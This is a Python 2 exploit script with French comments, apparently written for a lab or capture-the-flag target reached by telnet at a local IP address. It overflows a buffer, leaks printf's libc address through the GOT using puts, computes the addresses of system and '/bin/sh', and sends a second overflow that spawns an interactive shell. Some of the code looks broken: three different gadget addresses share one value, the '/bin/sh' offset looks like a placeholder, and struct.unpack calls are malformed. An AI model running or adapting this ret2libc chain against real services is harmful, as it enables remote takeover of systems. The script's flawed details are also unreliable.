#!/usr/bin/python2
import telnetlib,struct
# please don't use python 2, it is deprecated!
# use python 3 instead


tn = telnetlib.Telnet("192.168.1.29",1205) #Ouverture d'une session Telnet

print tn.read_until(">",1) #On s'arrête au début du programme

raw_input(); #Temporisation l'utilisateur doit mettre entrer pour continuer

keycode = [] #Création d'une liste

keycode.append(19299291)


tn.write("666\n") #On envoi un serial sur Telnet

for i in range(len(keycode)):
    tn.read_until("Enter keycode "+str(i)+":")
    tn.write(str(keycode[i])+"\n")

print tn.read_until("Enter new keycode:")

adresse_win ="03870408".decode('hex') #Adresse de rebouclage Win ATTENTION ADDRESSE EN LITTLE INDIAN : vrai adresse : 08048703
adresse_puts="03870408".decode('hex') #Puts adresse mémoire de l'instruction Puts ATTENTION ADDRESSE EN LITTLE INDIAN : vrai adresse : 08048703
adresse_gadget="03870408".decode('hex') #Il s'agit du pop et return à la suite ATTENTION ADDRESSE EN LITTLE INDIAN : vrai adresse : 08048703
adresse_printf_got="10D00408".decode('hex') #adresse de l'instruction print_f dans la table GOT ATTENTION ADDRESSE EN LITTLE INDIAN : vrai adresse : 0804D010

tn.write("0123456789ABCDEF"+adresse_puts+adresse_gadget+adresse_printf_got+adresse_win+"\n") #BUFFER OWERFLOW avec :
#
#
#
#

retour_data = tn.read_until("\n",1)[1:5] #Lecture des 4 premiers octets valable seulement pour un système 32 bits mettre 1:9 pour un système 64

adresse_printf_libc = hex(struct.unpack("<L", retour_data)[0])[0:10]

print "Adresse printf libc :", adresse_printf_libc

ref_printf = "0x528c0"
ecart_printf = int(adresse_printf_libc,16) - int(ref_printf,16)
ref_system = "0x3e980"
adresse_system_libc = struct.pack("<I", ecart_printf + int(ref_system,16)).encode('hex').decode('hex')

print "Adresse system libc", hex(struct.unpack("<L", adresse_system_libc,16)[0])[0:10]


ref_texte_binsh = "0x121212"
adresse_texte_binsh = struct.pack("<I", ecart_printf + int(ref_texte_binsh,16)).encode('hex').decode('hex')

print "Adresse binsh libc", hex(struct.unpack("<L", adresse_texte_binsh,16)[0])[0:10]

tn.read_until("Enter new keycode:")

tn.write("0123456789ABCDEF"+adresse_system_libc+adresse_gadget+adresse_texte_binsh+adresse_win+"\n")

print tn.read_until("bleuarh",1)

tn.interact()